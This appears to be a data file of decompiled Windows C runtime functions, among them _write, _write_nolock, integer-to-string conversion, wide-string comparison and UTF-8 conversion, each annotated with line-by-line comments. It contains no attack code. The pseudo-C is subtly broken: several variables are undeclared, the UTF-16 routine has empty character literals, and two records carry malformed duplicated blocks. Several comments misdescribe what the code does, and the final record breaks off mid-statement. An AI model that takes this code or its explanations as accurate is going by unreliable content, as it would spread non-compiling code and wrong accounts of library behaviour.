{"Function Name": "_write", "Address": "14001e2e0", "Source Code": "\nint __cdecl _write(int file_handle, void *buffer, uint max_char_count)\n{\n    ulong *error_number_pointer; // Pointer to store the address of the DOS error number\n\n    if (file_handle == -2) { // Check if the file handle is -2 (invalid)\n        error_number_pointer = __doserrno(); // Get the address of the DOS error number\n        *error_number_pointer = 9; // Set the error number to 9 (invalid handle)\n    } else {\n        // Check if the file handle is valid (non-negative and within a certain range)\n        if ((-1 < file_handle) && ((uint)file_handle < DAT_14003a880)) {\n            // Check if the file is open (the specific bit is set)\n            if ((*(byte *)((&DAT_14003a480)[(longlong)file_handle >> 6] + 0x38 +\n                (ulonglong)(file_handle & 0x3f) * 0x48) & 1) != 0) {\n                \n                // Lock the file handle for safe access\n                FID_conflict___acrt_lowio_lock_fh(file_handle);\n                \n                // Perform the write operation without lock\n                int write_result = _write_nolock(file_handle, buffer, max_char_count);\n                \n                // Unlock the file handle after the write operation\n                FID_conflict___acrt_lowio_lock_fh(file_handle);\n                \n                return write_result; // Return the result of the write operation\n            } else {\n                error_number_pointer = __doserrno(); // Get the address of the DOS error number\n                *error_number_pointer = 9; // Set the error number to 9 (invalid handle)\n            }\n        }\n    }\n    \n    error_number_pointer = __doserrno(); // Get the address of the DOS error number\n    *error_number_pointer = 9; // Set the error number to 9 (invalid handle)\n    FUN_14000ecf8(); // Call a function (possibly for cleanup or logging)\n    \n    return -1; // Return -1 to indicate an error occurred\n}\n"}
{"Function Name": "_write_nolock", "Address": "14001e3cc", "Source Code": "\nint __cdecl _write_nolock(int file_handle, void *buffer, uint max_char_count)\n{\n    char character_type; // Variable to store character type\n    int isatty_result; // Variable to store return value from _isatty\n    BOOL console_mode_result; // Variable to store result of GetConsoleMode\n    DWORD last_error_code; // Variable to store last error code\n    ulong *dos_error_pointer; // Pointer for DOS error handling\n    ulonglong file_handle_manipulation; // Variable to store file handle manipulation\n    longlong shifted_file_handle; // Variable to store shifted file handle\n    wchar_t *wide_char_buffer_pointer; // Pointer for wide character buffer\n    undefined8 output_variable; // Local variable to store output\n    int write_file_variable; // Local variable for WriteFile\n    undefined8 output_status; // Local variable for output status\n    wchar_t wide_char_buffer[8]; // Local buffer for wide characters\n\n    // Check if maximum character count is zero\n    if (max_char_count == 0) {\n        return 0; // Return 0 if no characters to write\n    }\n    \n    // Check if buffer is null\n    if (buffer == (void *)0x0) {\n        dos_error_pointer = __doserrno(); // Get DOS error pointer\n        *dos_error_pointer = 0; // Clear previous error\n        dos_error_pointer = __doserrno(); // Get DOS error pointer again\n        *dos_error_pointer = 0x16; // Set error code for invalid argument\n        FUN_14000ecf8(); // Call error handling function\n        return -1; // Return -1 for error\n    }\n    \n    // Manipulate file handle to get necessary values\n    file_handle_manipulation = (ulonglong)(file_handle & 0x3f); // Extract lower bits of file handle\n    shifted_file_handle = (longlong)file_handle >> 6; // Shift file handle for indexing\n    character_type = *(char *)((&DAT_14003a480)[shifted_file_handle] + 0x39 + file_handle_manipulation * 0x48); // Get character type from data structure\n    \n    // Validate character type and maximum character count\n    if (((byte)(character_type - 1U) < 2) && ((~max_char_count & 1) == 0)) {\n        dos_error_pointer = __doserrno(); // Get DOS error pointer\n        *dos_error_pointer = 0; // Clear previous error\n        dos_error_pointer = __doserrno(); // Get DOS error pointer again\n        *dos_error_pointer = 0x16; // Set error code for invalid argument\n        FUN_14000ecf8(); // Call error handling function\n        return -1; // Return -1 for error\n    }\n    \n    // Check if file is in console mode\n    if ((*(byte *)((&DAT_14003a480)[shifted_file_handle] + 0x38 + file_handle_manipulation * 0x48) & 0x20) != 0) {\n        common_lseek_nolock<__int64>(file_handle, 0, 2); // Seek to end of file if in console mode\n    }\n    \n    output_status = 0; // Initialize local variable for output status\n    isatty_result = _isatty(file_handle); // Check if file handle is associated with a terminal\n    \n    // Check various conditions to determine writing method\n    if ((((isatty_result == 0) || (-1 < *(char *)((&DAT_14003a480)[shifted_file_handle] + 0x38 + file_handle_manipulation * 0x48))) ||\n        ((lVar11 = __acrt_getptd(), *(longlong *)(*(longlong *)(lVar11 + 0x90) + 0x138) == 0 &&\n        (*(char *)((&DAT_14003a480)[shifted_file_handle] + 0x39 + file_handle_manipulation * 0x48) == '\\0')))) ||\n        (console_mode_result = GetConsoleMode(*(HANDLE *)((&DAT_14003a480)[shifted_file_handle] + 0x28 + file_handle_manipulation * 0x48), (LPDWORD)wide_char_buffer), console_mode_result == 0))) {\n        \n        // If not a terminal or console mode, write directly to file\n        if (-1 < *(char *)((&DAT_14003a480)[shifted_file_handle] + 0x38 + file_handle_manipulation * 0x48)) {\n            output_variable = 0; // Initialize output variable\n            write_file_variable = 0; // Initialize WriteFile variable\n            console_mode_result = WriteFile(*(HANDLE *)((&DAT_14003a480)[shifted_file_handle] + 0x28 + file_handle_manipulation * 0x48), buffer,\n                max_char_count, (LPDWORD)((longlong)&output_variable + 4), (LPOVERLAPPED)0x0); // Write to file\n            if (console_mode_result == 0) { // Check if WriteFile failed\n                last_error_code = GetLastError(); // Get last error code\n                output_variable = CONCAT44(output_variable._4_4_, last_error_code); // Store error in output variable\n            }\n            goto LAB_14001e618; // Jump to error handling\n        }\n        \n        // Handle writing based on character type\n        if (character_type == '\\0') {\n            puVar12 = (undefined8 *)write_text_ansi_nolock((int)&output_variable, (char *)(ulonglong)(uint)file_handle, (uint)buffer); // Write ANSI text\n        }\n        else if (character_type == '\\x01') {\n            puVar12 = (undefined8 *)write_text_utf8_nolock((int)&output_variable, (char *)(ulonglong)(uint)file_handle, (uint)buffer); // Write UTF-8 text\n        }\n        else {\n            if (character_type != '\\x02') goto LAB_14001e618; // Check for UTF-16LE\n            puVar12 = (undefined8 *)write_text_utf16le_nolock((int)&output_variable, (char *)(ulonglong)(uint)file_handle, (uint)buffer); // Write UTF-16LE text\n        }\n    }\n    else {\n        // Handle writing for terminal output\n        if (character_type != '\\0') {\n            if ((byte)(character_type - 1U) < 2) {\n                output_variable = 0; // Initialize output variable\n                if (buffer < (wchar_t *)((longlong)buffer + (ulonglong)max_char_count)) { // Check buffer bounds\n                    wide_char_buffer_pointer = (wchar_t *)buffer; // Cast buffer to wide character pointer\n                    do {\n                        wide_char_buffer[0] = *wide_char_buffer_pointer; // Get current wide character\n                        if (_putwch_nolock(wide_char_buffer[0]) != wide_char_buffer[0]) { // Write wide character\n                            last_error_code = GetLastError(); // Get last error code\n                            output_variable = CONCAT44(output_variable._4_4_, last_error_code); // Store error in output variable\n                            break; // Break on error\n                        }\n                        output_variable = CONCAT44(isatty_result + 2, (undefined4)output_variable); // Update output variable\n                        isatty_result += 2; // Increment character count\n                        if (wide_char_buffer[0] == L'\\n') { // Check for newline\n                            if (_putwch_nolock(L'\\r') != 0xd) { // Write carriage return\n                                last_error_code = GetLastError(); // Get last error code\n                                output_variable = CONCAT44(output_variable._4_4_, last_error_code); // Store error in output variable\n                                break; // Break on error\n                            }\n                            output_variable = CONCAT44(isatty_result + 1, (undefined4)output_variable); // Update output variable\n                            isatty_result += 1; // Increment character count\n                        }\n                        wide_char_buffer_pointer++; // Move to next wide character\n                    } while (wide_char_buffer_pointer < (wchar_t *)((longlong)buffer + (ulonglong)max_char_count)); // Loop until buffer end\n                }\n            }\n            goto LAB_14001e618; // Jump to error handling\n        }\n        \n        // Handle writing for double translated ANSI\n        puVar12 = (undefined8 *)write_double_translated_ansi_nolock((int)&output_variable, (char *)(ulonglong)(uint)file_handle, (uint)buffer);\n    }\n    \n    iVar13 = *(int *)(puVar12 + 1); // Get return value from write function\n    uVar3 = *puVar12; // Get status from write function\nLAB_14001e618:\n    output_status = uVar3; // Store status in local variable\n    isatty_result = (int)((ulonglong)output_status >> 0x20); // Extract high part of status\n    if (isatty_result != 0) {\n        return isatty_result - iVar13; // Return difference for error\n    }\n    \n    // Check for specific error conditions\n    if ((int)output_status != 0) {\n        if ((int)output_status == 5) {\n            dos_error_pointer = __doserrno(); // Get DOS error pointer\n            *dos_error_pointer = 9; // Set error code for invalid handle\n            dos_error_pointer = __doserrno(); // Get DOS error pointer again\n            *dos_error_pointer = 5; // Set error code for invalid argument\n            return -1; // Return -1 for error\n        }\n        __acrt_errno_map_os_error((int)output_status); // Map OS error to CRT error\n        return -1; // Return -1 for error\n    }\n    \n    // Check for end-of-file condition\n    if (((*(byte *)((&DAT_14003a480)[shifted_file_handle] + 0x38 + file_handle_manipulation * 0x48) & 0x40) != 0) && (*buffer == '\\x1a')) {\n        return 0; // Return 0 for end-of-file\n    }\n    \n    // Set generic error condition\n    dos_error_pointer = __doserrno(); // Get DOS error pointer\n    *dos_error_pointer = 0x1c; // Set error code for generic error\n    dos_error_pointer = __doserrno(); // Get DOS error pointer again\n    *dos_error_pointer = 0; // Clear error\n    return -1; // Return -1 for error\n}\n"}
{"Function Name": "common_xtox<unsigned_long,wchar_t>", "Address": "14001e6a8", "Source Code": "\\*\nint __cdecl\ncommon_xtox<unsigned_long,wchar_t>\n(ulong param_1,wchar_t *param_2,__uint64 param_3,uint param_4,bool param_5)\n{\n    wchar_t *pwVar2; // Pointer to the current position in the output string\n    short sVar3; // Variable to hold character offset for digits\n    ulonglong uVar4; // Variable to hold the current value of param_1\n    int iVar6; // Return value\n    ulonglong uVar7; // Counter for the number of characters processed\n\n    // Check if the number is negative\n    if (param_5) {\n        param_1 = -param_1; // Negate the number\n        *param_2 = L'-'; // Store the negative sign in the output\n        pwVar2 = param_2 + 1; // Move pointer to the next position\n    } else {\n        pwVar2 = param_2; // Set pointer to the start of the output\n    }\n\n    uVar7 = (ulonglong)param_5; // Initialize character count based on sign\n    do {\n        uVar4 = (ulonglong)param_1; // Store current value of param_1\n        param_1 = param_1 / param_4; // Divide param_1 by base\n        // Determine character offset for digits (0-9 or A-F)\n        sVar3 = (uint)(uVar4 % (ulonglong)param_4) < 10 ? 0x30 : 0x57; \n        *pwVar2++ = sVar3 + (short)(uVar4 % (ulonglong)param_4); // Store character in output\n        uVar7++; // Increment character count\n    } while (param_1 != 0 && uVar7 < param_3); // Continue until all digits are processed or limit reached\n\n    // Check if the output fits within the specified limit\n    if (uVar7 < param_3) {\n        *pwVar2 = L'\\0'; // Null-terminate the output string\n        wchar_t *start = param_2 + (param_5 ? 1 : 0); // Set start pointer\n        wchar_t *end = pwVar2 - 1; // Set end pointer\n        // Reverse the output string\n        while (start < end) {\n            wchar_t wVar1 = *start; // Temporary variable for swapping\n            *start++ = *end; // Swap characters\n            *end-- = wVar1; // Swap characters\n        }\n        iVar6 = 0; // Set return value to success\n    } else {\n        *param_2 = L'\\0'; // Null-terminate output on failure\n        __uint64 *puVar5 = __doserrno(); // Get pointer to error code\n        iVar6 = 0x22; // Set error code\n        *puVar5 = 0x22; // Store error code\n        FUN_14000ecf8(); // Call error handling function\n    }\n    return iVar6; // Return success or error code\n}\n*\\ \n \n\nint __cdecl\ncommon_xtox<unsigned_long,wchar_t>\n(ulong param_1,wchar_t *param_2,__uint64 param_3,uint param_4,bool param_5)\n{\n    wchar_t *pwVar2;\n    short sVar3;\n    ulonglong uVar4;\n    int iVar6;\n    ulonglong uVar7;\n\n    if (param_5) {\n        param_1 = -param_1;\n        *param_2 = L'-';\n        pwVar2 = param_2 + 1;\n    } else {\n        pwVar2 = param_2;\n    }\n\n    uVar7 = (ulonglong)param_5;\n    do {\n        uVar4 = (ulonglong)param_1;\n        param_1 = param_1 / param_4;\n        sVar3 = (uint)(uVar4 % (ulonglong)param_4) < 10 ? 0x30 : 0x57;\n        *pwVar2++ = sVar3 + (short)(uVar4 % (ulonglong)param_4);\n        uVar7++;\n    } while (param_1 != 0 && uVar7 < param_3);\n\n    if (uVar7 < param_3) {\n        *pwVar2 = L'\\0';\n        wchar_t *start = param_2 + (param_5 ? 1 : 0);\n        wchar_t *end = pwVar2 - 1;\n        while (start < end) {\n            wchar_t wVar1 = *start;\n            *start++ = *end;\n            *end-- = wVar1;\n        }\n        iVar6 = 0;\n    } else {\n        *param_2 = L'\\0';\n        __uint64 *puVar5 = __doserrno();\n        iVar6 = 0x22;\n        *puVar5 = 0x22;\n        FUN_14000ecf8();\n    }\n    return iVar6;\n}\n"}
{"Function Name": "common_xtox_s<unsigned_long,wchar_t>", "Address": "14001e77c", "Source Code": "\\*\nint __cdecl\ncommon_xtox_s<unsigned_long,wchar_t>\n(ulong param_1,wchar_t *param_2,__uint64 param_3,uint param_4,bool param_5)\n{\n    ulong *puVar2; // Pointer to store the address of the DOS error variable\n    ulong uVar3;   // Variable to hold the error code\n\n    // Check if param_2 is not null and param_3 is not zero\n    if (param_2 != (wchar_t *)0x0 && param_3 != 0) {\n        *param_2 = L'\\0'; // Initialize the output string to an empty wide character\n\n        // Check if param_3 is less than or equal to param_5 + 1\n        if (param_3 <= (ulonglong)param_5 + 1) {\n            puVar2 = __doserrno(); // Get the address of the DOS error variable\n            uVar3 = 0x22; // Set error code to 0x22\n            goto LAB_14001e796; // Jump to error handling\n        }\n\n        // Check if param_4 is less than 2 + 0x23\n        if (param_4 - 2 < 0x23) {\n            // Call common_xtox function with the provided parameters\n            return common_xtox<unsigned_long,wchar_t>(param_1,param_2,param_3,param_4,param_5);\n        }\n    }\n\n    puVar2 = __doserrno(); // Get the address of the DOS error variable\n    uVar3 = 0x16; // Set error code to 0x16\n\nLAB_14001e796:\n    *puVar2 = uVar3; // Store the error code in the DOS error variable\n    FUN_14000ecf8(); // Call the error handling function\n    return uVar3; // Return the error code\n}\n*\\ \n \n\nint __cdecl\ncommon_xtox_s<unsigned_long,wchar_t>\n(ulong param_1,wchar_t *param_2,__uint64 param_3,uint param_4,bool param_5)\n{\nulong *puVar2;\nulong uVar3;\nif (param_2 != (wchar_t *)0x0 && param_3 != 0) {\n    *param_2 = L'\\0';\n    if (param_3 <= (ulonglong)param_5 + 1) {\n        puVar2 = __doserrno();\n        uVar3 = 0x22;\n        goto LAB_14001e796;\n    }\n    if (param_4 - 2 < 0x23) {\n        return common_xtox<unsigned_long,wchar_t>(param_1,param_2,param_3,param_4,param_5);\n    }\n}\npuVar2 = __doserrno();\nuVar3 = 0x16;\nLAB_14001e796:\n*puVar2 = uVar3;\nFUN_14000ecf8();\nreturn uVar3;\n}\n"}
{"Function Name": "_itow_s", "Address": "14001e7e8", "Source Code": "\nerrno_t __cdecl _itow_s(int value, wchar_t *destinationBuffer, size_t bufferSize, int base)\n{\n    // Call the common function to convert an integer to a wide character string\n    // Pass the integer value, destination buffer, size of the buffer, and the radix\n    // The last argument checks if the radix is 10 and the value is negative for proper handling\n    return common_xtox_s<unsigned_long, wchar_t>(value, destinationBuffer, bufferSize, base, (base == 10 && value < 0));\n}\n"}
{"Function Name": "_wcsnicmp", "Address": "14001e808", "Source Code": "\nint __cdecl _wcsnicmp(wchar_t *str1, wchar_t *str2, size_t maxCount)\n{\n    int comparisonResult = 0; // Variable to store the result of comparison\n    if (conditionCheck != 0) { // Check if a specific condition is met\n        return _wcsnicmp_l(str1, str2, maxCount, (_locale_t)0x0); // Call locale-specific comparison function\n    }\n    if (maxCount != 0) { // Ensure there are characters to compare\n        if (str1 == (wchar_t *)0x0 || str2 == (wchar_t *)0x0) { // Check for null pointers\n            *errorCode() = 0x16; // Set error code\n            errorHandler(); // Call error handling function\n            return 0x7fffffff; // Return maximum integer value on error\n        }\n        do {\n            wchar_t char1 = *str1 + L' '; // Convert character from _Str1 to lowercase\n            wchar_t char2 = *str2 + L' '; // Convert character from _Str2 to lowercase\n            if (0x19 < (ushort)(*str1 - 0x41U)) { // Check if character is not an uppercase letter\n                char1 = *str1; // Keep original character if not uppercase\n            }\n            if (0x19 < (ushort)(*str2 - 0x41U)) { // Check if character is not an uppercase letter\n                char2 = *str2; // Keep original character if not uppercase\n            }\n            str1++; // Move to the next character in _Str1\n            str2++; // Move to the next character in _Str2\n            maxCount--; // Decrement the count of characters to compare\n            if (char1 != char2 || char1 == L'\\0') { // Check for mismatch or end of string\n                break; // Exit loop if characters differ or end of string is reached\n            }\n        } while (maxCount != 0); // Continue until no characters left to compare\n        comparisonResult = (uint)(ushort)char1 - (uint)(ushort)char2; // Calculate the difference between the characters\n    }\n    return comparisonResult; // Return the result of the comparison\n}\n"}
{"Function Name": "_wcsnicmp_l", "Address": "14001e8b4", "Source Code": "\nint __cdecl _wcsnicmp_l(wchar_t *str1, wchar_t *str2, size_t max_count, _locale_t locale)\n{\n    wchar_t char1, char2; // Variables to hold characters from each string\n    int comparison_result = 0; // Variable to store the result of comparison\n    ulong *error_pointer; // Pointer for error handling\n    localeinfo_struct locale_info; // Structure to hold locale information\n    longlong locale_update; // Variable for locale update\n\n    if (max_count != 0) { // Check if the maximum count is not zero\n        if ((str1 == (wchar_t *)0x0) || (str2 == (wchar_t *)0x0)) { // Check for null pointers\n            error_pointer = __doserrno(); // Get the pointer to the DOS error number\n            *error_pointer = 0x16; // Set the error number to 0x16 (invalid argument)\n            FUN_14000ecf8(); // Call error handling function\n            comparison_result = 0x7fffffff; // Set iVar3 to maximum integer value to indicate error\n        } else {\n            _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&locale_update, (__crt_locale_pointers *)locale); // Update locale information\n            if ((locale_info.locinfo)->locale_name[2] == (wchar_t *)0x0) { // Check if locale is not case-sensitive\n                do {\n                    char1 = *str1 + L' '; // Convert character from Str1 to lower case\n                    if (0x19 < (ushort)(*str1 - 0x41U)) { // Check if character is not an uppercase letter\n                        char1 = *str1; // Keep original character\n                    }\n                    char2 = *str2 + L' '; // Convert character from Str2 to lower case\n                    if (0x19 < (ushort)(*str2 + 0xFF)) { // Check if character is not an uppercase letter\n                        char2 = *str2; // Keep original character\n                    }\n                    str1++; // Move to the next character in Str1\n                    str2++; // Move to the next character in Str2\n                    max_count--; // Decrease the remaining count\n                } while ((max_count != 0) && (char1 != L'\\0') && (char1 == char2)); // Continue while characters are equal and not at the end\n            } else {\n                do {\n                    char1 = _towlower_l(*str1, &locale_info); // Convert character from Str1 to lower case using locale\n                    char2 = _towlower_l(*str2, &locale_info); // Convert character from Str2 to lower case using locale\n                    str1++; // Move to the next character in Str1\n                    str2++; // Move to the next character in Str2\n                    max_count--; // Decrease the remaining count\n                    if ((max_count == 0) || (char1 == L'\\0')) break; // Break if count is zero or end of string is reached\n                } while (char1 == char2); // Continue while characters are equal\n            }\n            comparison_result = (uint)(ushort)char1 - (uint)(ushort)char2; // Calculate the difference between the two characters\n        }\n    }\n    return comparison_result; // Return the result of the comparison\n}\n"}
{"Function Name": "wcscmp", "Address": "14001e9dc", "Source Code": "\nint __cdecl wcscmp(wchar_t *firstString, wchar_t *secondString)\n{\n    int charDifference; // Variable to store the difference between characters\n    // Loop until the characters are equal and the end of the second string is not reached\n    while ((charDifference = (uint)(ushort)*firstString - (uint)(ushort)*secondString) == 0 && *secondString != L'\\0') {\n        firstString++; // Move to the next character in the first string\n        secondString++; // Move to the next character in the second string\n    }\n    // Return the comparison result: positive if _Str1 > _Str2, negative if _Str1 < _Str2, zero if equal\n    return (charDifference >> 0x1f) - (-charDifference >> 0x1f);\n}\n"}
{"Function Name": "__crt_mbstring::__mbrtoc32_utf8", "Address": "14001ea14", "Source Code": "\n__uint64 __cdecl\n__crt_mbstring::__mbrtoc32_utf8(wchar32 *param_1, char *param_2, __uint64 param_3, _Mbstatet *param_4)\n{\n    byte bVar1; // Variable to hold a byte value from the input string\n    ushort uVar2; // Variable to hold a ushort value from the state\n    uint uVar4; // Variable to hold the decoded character value\n    ulonglong uVar5; // Variable to hold the length of the UTF-8 sequence\n    ulonglong uVar6; // Variable to hold the maximum length of the UTF-8 sequence\n    uint *puVar7; // Pointer to store the result character\n    byte *pbVar8; // Pointer to traverse the input byte string\n    _Mbstatet _Var9; // Variable to hold the current state\n    ulonglong uVar10; // Variable to hold the state value\n    _Mbstatet *p_Var11; // Pointer to the state structure\n    ulonglong uVar12; // Variable to hold the length of the input string\n    undefined1 auStack_68[24]; // Stack space for temporary storage\n    uint auStack_50[6]; // Stack space for temporary storage of uint values\n    ulonglong local_38; // Local variable for security cookie\n\n    // Initialize local_38 with a security cookie\n    local_38 = DAT_140038080 ^ (ulonglong)auStack_68;\n\n    // Set p_Var11 to param_4 if it's not null, otherwise use a default state\n    p_Var11 = param_4 ? param_4 : (_Mbstatet *)&DAT_14003a9f0;\n\n    // Set pbVar8 to param_2 if it's not null, otherwise use a default byte array\n    pbVar8 = param_2 ? (byte *)param_2 : &DAT_140030314;\n\n    // Set uVar12 to param_3 if param_2 is not null, otherwise default to 1\n    uVar12 = param_2 ? param_3 : 1;\n\n    // Set puVar7 to point to param_1 if param_2 is not null, otherwise set to null\n    puVar7 = (uint *)(-(ulonglong)(param_2 != (char *)0x0) & (ulonglong)param_1);\n\n    // If uVar12 is 0, go to the end of the function\n    if (uVar12 == 0) goto LAB_14001ebcf;\n\n    // Get the state value from the state structure\n    uVar2 = *(ushort *)(p_Var11 + 6);\n    uVar10 = (ulonglong)uVar2;\n\n    // If the state value is 0, process the first byte\n    if (uVar2 == 0) {\n        bVar1 = *pbVar8++; // Read the next byte from the input\n        if (-1 < (char)bVar1) { // If the byte is a valid character\n            if (puVar7) {\n                *puVar7 = (uint)bVar1; // Store the character in the output\n            }\n            goto LAB_14001ebcf; // Go to the end of the function\n        }\n\n        // Determine the number of bytes in the UTF-8 sequence based on the first byte\n        if ((bVar1 & 0xe0) == 0xc0) {\n            _Var9 = (_Mbstatet)0x2; // 2-byte sequence\n        } else if ((bVar1 & 0xf0) == 0xe0) {\n            _Var9 = (_Mbstatet)0x3; // 3-byte sequence\n        } else {\n            if ((bVar1 & 0xf8) != 0xf0) goto LAB_14001ebbb; // Invalid byte\n            _Var9 = (_Mbstatet)0x4; // 4-byte sequence\n        }\n\n        uVar10 = (ulonglong)(byte)_Var9; // Set the state to the number of bytes\n        uVar4 = (1 << (7U - (char)_Var9 & 0x1f)) - 1U & (uint)bVar1; // Initialize the character value\n\n    LAB_14001eb12:\n        uVar6 = uVar10 & 0xff; // Get the maximum length of the UTF-8 sequence\n        uVar5 = uVar12 <= uVar6 ? uVar12 : uVar6; // Determine how many bytes to read\n\n        // Read the remaining bytes of the UTF-8 sequence\n        while ((ulonglong)((longlong)pbVar8 - (longlong)param_2) < uVar5) {\n            bVar1 = *pbVar8++; // Read the next byte\n            if ((bVar1 & 0xc0) != 0x80) goto LAB_14001ebbb; // Check for valid continuation byte\n            uVar4 = bVar1 & 0x3f | uVar4 << 6; // Update the character value\n        }\n\n        // If fewer bytes were read than expected, update the state\n        if (uVar5 < uVar6) {\n            *(ushort *)(p_Var11 + 4) = (ushort)(byte)_Var9; // Update the state for remaining bytes\n            *(ushort *)(p_Var11 + 6) = (ushort)(byte)((char)uVar10 - (char)uVar5); // Update remaining bytes\n            *(uint *)p_Var11 = uVar4; // Store the character value\n            goto LAB_14001ebcf; // Go to the end of the function\n        }\n\n        // Validate the decoded character value\n        if ((0x7ff < uVar4 - 0xd800) && (uVar4 < 0x110000)) {\n            auStack_50[2] = 0x80; // Set up for UTF-8 encoding\n            auStack_50[3] = 0x800; // Set up for UTF-8 encoding\n            auStack_50[4] = 0x10000; // Set up for UTF-8 encoding\n            if (auStack_50[(byte)_Var9] <= uVar4) { // Check if the character is valid\n                if (puVar7) {\n                    *puVar7 = uVar4; // Store the valid character\n                }\n                *(undefined8 *)p_Var11 = 0; // Reset the state\n                goto LAB_14001ebcf; // Go to the end of the function\n            }\n        }\n    } else {\n        _Var9 = p_Var11[4]; // Get the state for continuation\n        uVar4 = *(uint *)p_Var11; // Get the current character value\n        // Check if we can continue decoding based on the state\n        if ((((byte)((char)_Var9 - 2U) < 3) && (SUB21(uVar2, 0) != (_Mbstatet)0x0)) &&\n            ((byte)SUB21(uVar2, 0) < (byte)_Var9))) goto LAB_14001eb12; // Continue decoding\n    }\n\nLAB_14001ebbb:\n    *(undefined8 *)p_Var11 = 0; // Reset the state on error\n    *(__doserrno()) = 0x2a; // Set the error code\nLAB_14001ebcf:\n    __security_check_cookie(local_38 ^ (ulonglong)auStack_68); // Check the security cookie\n    return 0; // Return 0 to indicate completion\n}\n"}
{"Function Name": "__crt_mbstring::__c16rtomb_utf8", "Address": "14001ebf0", "Source Code": "\n__uint64 __cdecl __crt_mbstring::__c16rtomb_utf8(char *output_buffer, wchar16 input_character, _Mbstatet *state)\n{\n    __uint64 return_value; // Variable to store the return value\n    _Mbstatet *current_state = state ? state : (_Mbstatet *)&DAT_14003a9f8; // Use provided state or default state\n\n    if (*(int *)current_state == 0) { // Check if the state is initialized\n        if (0x3ff < (ushort)(input_character + L'')) { // Check if param_2 is greater than 0x3ff\n            if ((ushort)(input_character + L'') < 0x400) { // Check if param_2 is less than 0x400\n                *(uint *)current_state = ((ushort)input_character & 0x3f27ff) * 0x400 + 0x10000; // Calculate and store the value in state\n                return 0; // Return 0 indicating success\n            }\n            return_value = __c32rtomb_utf8(output_buffer, (uint)(ushort)input_character, current_state); // Convert to UTF-8 using __c32rtomb_utf8\n            return return_value; // Return the result of the conversion\n        }\n    } else if ((ushort)(input_character + L'') < 0x400) { // Check if param_2 is less than 0x400 when state is initialized\n        return_value = __c32rtomb_utf8(output_buffer, ((ushort)input_character & 0xffff23ff) + *(int *)current_state, (_Mbstatet *)0); // Convert to UTF-8 with adjusted value\n        *(undefined8 *)current_state = 0; // Reset the state\n        return return_value; // Return the result of the conversion\n    }\n    \n    *(undefined8 *)current_state = 0; // Reset the state in case of failure\n    ulong *error_pointer = __doserrno(); // Get the pointer to the DOS error number\n    *error_pointer = 0x2a; // Set the error number to 0x2a (invalid argument)\n    return 0xffffffffffffffff; // Return -1 indicating failure\n}\n"}
{"Function Name": "FUN_14001eca0", "Address": "14001eca0", "Source Code": "\ndouble FUN_14001eca0(void) // Function declaration\n{\n    undefined1 auVar16[16]; // Array to hold undefined data\n    ulonglong uVar13; // Variable to hold unsigned long long value\n    ulonglong uVar14; // Variable to hold unsigned long long value\n    double dVar15; // Variable to hold double value\n    double dVar20; // Variable to hold double value\n    double dVar23; // Variable to hold double value\n    double dVar24; // Variable to hold double value\n    double dVar26; // Variable to hold double value\n    double dVar37; // Variable to hold double value\n    undefined1 in_ZMM0[64]; // Input data from ZMM register\n\n    dVar15 = in_ZMM0._0_8_; // Assign first 8 bytes of in_ZMM0 to dVar15\n    auVar16 = in_ZMM0._0_16_; // Assign first 16 bytes of in_ZMM0 to auVar16\n\n    if (DAT_14003a888 == 0) { // Check if DAT_14003a888 is zero\n        if ((double)((ulonglong)dVar15 & (ulonglong)DAT_140030340) == DAT_140030340) { // Check if dVar15 matches DAT_140030340\n            if (dVar15 == DAT_140030340) { // If dVar15 is exactly DAT_140030340\n                return dVar15; // Return dVar15\n            }\n            if (dVar15 != DAT_140030330) { // If dVar15 is not DAT_140030330\n                return (double)((ulonglong)dVar15 | _DAT_140030360); // Return modified dVar15\n            }\n        } else { // If dVar15 does not match DAT_140030340\n            dVar37 = (double)(int)(((ulonglong)dVar15 >> 0x34) - _DAT_140030370); // Calculate dVar37 based on dVar15\n            if (0.0 < dVar15) { // Check if dVar15 is positive\n                dVar20 = (double)((ulonglong)dVar15 & (ulonglong)DAT_140030390); // Extract part of dVar15 into dVar20\n                if (dVar37 == DAT_1400304b0) { // Check if dVar37 matches DAT_1400304b0\n                    dVar37 = (double)((ulonglong)dVar20 | (ulonglong)DAT_140030420) - DAT_140030420; // Modify dVar37\n                    dVar20 = (double)((ulonglong)dVar37 & (ulonglong)DAT_140030390); // Update dVar20 based on dVar37\n                    dVar37 = (double)(int)((uint)((ulonglong)dVar37 >> 0x34) - _DAT_1400304c0); // Update dVar37\n                }\n                uVar13 = ((ulonglong)dVar20 & _DAT_1400303a0) + ((ulonglong)dVar20 & _DAT_1400303b0) * 2; // Calculate uVar13\n\n                if ((double)((ulonglong)(dVar15 - DAT_140030420) & _DAT_140030510) < DAT_1400304d0) { // Check condition on dVar15\n                    dVar15 = dVar15 - DAT_140030420; // Adjust dVar15\n                    dVar37 = dVar15 / (DAT_140030410 + dVar15); // Calculate dVar37\n                    dVar20 = dVar37 + dVar37; // Double dVar37 into dVar20\n                    dVar23 = dVar20 * dVar20; // Square dVar20 into dVar23\n                    dVar24 = dVar23 * dVar20; // Cube dVar20 into dVar24\n                    dVar26 = (double)((ulonglong)dVar15 & (ulonglong)DAT_140030560); // Extract part of dVar15 into dVar26\n                    dVar15 = (((DAT_140030530 * dVar23 + DAT_140030520) * dVar24 + // Calculate new dVar15 based on polynomial\n                                (DAT_140030550 * dVar23 + DAT_140030540) * dVar24 * dVar24 * dVar20) -\n                               dVar15 * dVar37) + (dVar15 - dVar26); // Final adjustment to dVar15\n                    return dVar26 * DAT_1400303e0 + dVar15 * DAT_1400303e0 + dVar15 * DAT_1400303d0 + // Return final computed value\n                           dVar26 * DAT_1400303d0;\n                }\n                uVar14 = uVar13 >> 0x2c; // Shift uVar13 to get uVar14\n                dVar20 = ((double)(uVar13 | DAT_140030430) - (double)((ulonglong)dVar20 | DAT_140030430)) * // Calculate dVar20 based on uVar13\n                          *(double *)(&DAT_14002b7e0 + uVar14 * 8); // Multiply by value from DAT_14002b7e0\n                dVar15 = dVar20 * dVar20; // Square dVar20 into dVar15\n                return *(double *)(&DAT_140030580 + uVar14 * 8) + DAT_1400303f0 * dVar37 + // Return computed value based on uVar14\n                       *(double *)(&DAT_140030d90 + uVar14 * 8) +\n                       (DAT_140030400 * dVar37 - // Adjust based on dVar20 and dVar15\n                        ((DAT_140030470 * dVar20 + _DAT_140030460) * dVar15 + dVar20 +\n                         ((DAT_1400304a0 * dVar20 + DAT_140030490) * dVar20 + DAT_140030480) * dVar15 * dVar15\n                        ) * DAT_1400303c0);\n            }\n            if (dVar15 == 0.0) { // Check if dVar15 is zero\n                dVar15 = 